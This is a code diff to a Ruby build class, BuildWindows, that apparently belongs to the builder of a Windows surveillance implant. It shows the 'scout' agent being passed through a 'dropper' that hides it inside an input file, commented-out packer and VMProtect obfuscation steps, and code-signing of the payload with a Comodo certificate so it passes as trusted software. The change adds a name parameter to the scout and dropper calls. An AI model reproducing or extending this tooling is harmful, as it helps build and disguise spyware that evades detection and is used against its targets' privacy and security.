@@ -252,7 +252,8 @@ class BuildWindows < Build
 
   def cook
     if @scout
-      cook_param = '-S ' + path('scout') + ' -O ' + path('output')
+      name = scout_name(@factory.confkey)[:name]
+      cook_param = '-S ' + path('scout') + ' -O ' + path('output') + ' -N ' + name
     else
       key = Digest::MD5.digest(@factory.logkey).unpack('H2').first.upcase
 
@@ -326,7 +327,8 @@ class BuildWindows < Build
     FileUtils.mv input, path('input')
 
     if @scout
-      CrossPlatform.exec path('dropper'), '-s ' + path('scout') + ' ' + path('input') + ' ' + path('output')
+      name = scout_name(@factory.confkey)[:name]
+      CrossPlatform.exec path('dropper'), '-s ' + path('scout') + ' ' + path('input') + ' ' + path('output') + ' ' + name
     else
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                           (@bit64 ? path(@scrambled[:core64]) : 'null') +' '+
@@ -429,6 +431,10 @@ class BuildWindows < Build
 
     # pack the scout
     #CrossPlatform.exec path('packer32'), "#{path('scout')}"
+
+    # vmprotect the scout
+    #CrossPlatform.exec path('VMProtect_Con'), "#{path('scout')} #{path('scout_vmp')}"
+    #FileUtils.mv path('scout_vmp'), path('scout')
 
     # sign it
     CrossPlatform.exec path('signtool'), "sign /P #{Config.instance.global['CERT_PASSWORD']} /f #{Config.instance.cert("windows.pfx")} /ac #{Config.instance.cert("comodo.cer")} #{path('scout')}" if to_be_signed?
